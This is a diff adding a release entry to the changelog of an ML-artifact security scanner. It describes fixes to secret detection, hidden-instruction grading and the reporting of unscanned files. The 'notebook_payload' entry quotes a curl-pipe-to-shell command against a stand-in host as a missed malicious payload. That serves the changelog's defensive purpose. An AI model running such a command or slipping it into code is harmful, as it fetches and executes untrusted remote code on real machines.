@@ -7,6 +7,8 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+## [0.26.1] - 2026-09-21 — a field report, and the audit of its own fix
+
 ### Added
 
 - **Generated `site/sitemap.xml` and `site/robots.txt` now describe the built tree.**
@@ -38,10 +40,80 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ### Fixed
 
+- **Unreadable artifacts now use `Verdict("inconclusive", 0.0, …)` through
+  `unscanned_verdict`, not a finding with severity.** Six rules previously reported
+  unreadable artifacts as LOW: `pickle_opcode`, `keras_lambda`, `chat_template`,
+  `onnx_graph`, `hidden_instructions`, and `notebook_payload`. Four attached
+  `lead_verdict`, whose outcome is "fail", and two attached nothing. A profile with
+  `fail_on.severity: medium` therefore promoted a 28 GB model store with 102
+  unreadable pickle members while reporting `unverified: 0`. Over the same tree,
+  the same profile exited 0 on 0.26.0 and exits 2 now.
+- **`fail_on_inconclusive` now treats missing knowledge as unthresholdable in both
+  gates.** `core/gate.py` had compared unverified results with `fail_on.severity`,
+  so LOW never cleared a medium bar; `diff/gate.py` repeated that category error.
+  This changes gate outcomes: a run that passed can now exit 2, and `guardana diff`
+  that exited 0 can now exit 1. The switch is off by default; `monitor`'s built-in
+  preset turns it on. Before this fix, `guardana diff` could print
+  "Worse than the previous run" over a blinded check and still exit 0.
+- **Secrets in JSON comments are now detected without prefix false positives.**
+  The report showed `matched LLM provider API key pattern: sk-cli…` on a BM25
+  vocabulary with 2,458,944 keys and no API key. The reporter's evidence was right
+  and their explanation was not: the tool's own redacted output pointed at adjacent
+  JSON entries. The real cause was `sk-` plus 23 alphanumerics matching inside
+  `risk-clinicalpredictionmodel`; it redacted to exactly `sk-cli…`, hiding the cause
+  from the check that "17 tokens start with sk-". Every prefix now has a word-start
+  anchor shared with `output/secrets` and `trace/secret_in_tool_argument`; a second
+  JSON-string-scalar guard was removed before release because it silently dropped a
+  key in a comment in `devcontainer.json` or `tsconfig.json`. Hits past column 200
+  put a byte offset in `detail`, never the summary hashed by the finding fingerprint.
+- **`hidden_instructions` now grades zero-width payloads by plausibility.** One
+  U+200B in PDF-derived prose had produced a HIGH finding, although PDF extraction
+  routinely inserts zero-width spaces. A bidi control or a Tags character is HIGH;
+  so is a run of eight or more zero-width characters, or zero-width characters on a
+  line already matching an override phrase. A lone zero-width space between two
+  words is LOW. The threshold is eight because a zero-width channel carries one bit
+  per character.
+- **`notebook_payload` and `saved_model_ops` now report read-bound truncation as
+  unscanned.** A 17 MB `.ipynb` containing
+  `os.system("curl http://evil.sh | sh")` produced `0 finding(s)` and exit 0, while
+  the same notebook at 10 MB produced a HIGH finding. The oversized notebook had
+  returned as clean because it was too large to parse. `saved_model_ops` also read
+  the truncation flag and discarded it, creating the same silence.
+- **The terminal and JUnit now refuse to present an unverified run as green.** A run
+  whose only news was unreadable input had printed `✓ No findings.`. JUnit had
+  rendered `failures="0" skipped="1" errors="0"`, which dashboards read as a pass.
+  The tick now has a sixth refusal, and JUnit counts an unverified run as an error.
+  The terminal now shows both causes: an artifact rule's summary names the member or
+  cap, while a graded rule's rationale names why the judge failed; either can be the
+  specific one.
+- **A relative `contracts:` path now resolves beside its profile.** It had resolved
+  against the caller's working directory, so a committed profile worked from a
+  repository root and failed from a hook or a CI step. Absolute paths are unchanged.
+- **`probe` now rejects an uncomparable `--output` before spending anything.** The
+  warning had arrived after the budget was spent against a live endpoint, costing
+  GPU time or a metered API and forcing the run to be paid for twice. Only the
+  terminal format is refused; SARIF and JUnit files remain valid for a code-scanning
+  upload and a CI report reader, and neither concerns `diff`. `scan`,
+  `analyze-trace`, and `import-observations` send no requests and keep the warning.
+- **Authentication errors now name only flags accepted by the command.** A 401 from
+  `target inspect` had advised `--adapter`, which only `probe` accepts. The 429
+  message had named `--concurrency` the same way.
+- **Every provider hit now carries its own label.** This release introduced the
+  defect while anchoring the secret prefixes above, and the adversarial audit
+  caught it before shipping. The
+  merged per-pattern scans shared one binding, so every hit reported the last
+  pattern's label. A GitHub token was therefore described as a provider API key.
 - **Canonical links under `site/docs/` now use the extensionless URLs served by the
   host.** The `.html` forms returned 307 redirects, so canonical links contradicted
   their purpose. `sitegen.page.served_path` now supplies both canonical links and the
   sitemap, so the two cannot drift.
+
+### Upgrading
+
+Comparing a 0.26.0 run with a 0.26.1 run over the same tree reports the moved entries as
+BLINDED, "a proven problem can no longer be graded, not fixed". Nothing went blind at
+the upgrade: the tool was always blind to those artifacts and now says so. A baseline
+waiver cannot cover them, because waivers move entries out of `findings` only.
 
 ## [0.26.0] - 2026-09-20 — one command writes a pack that already passes
 
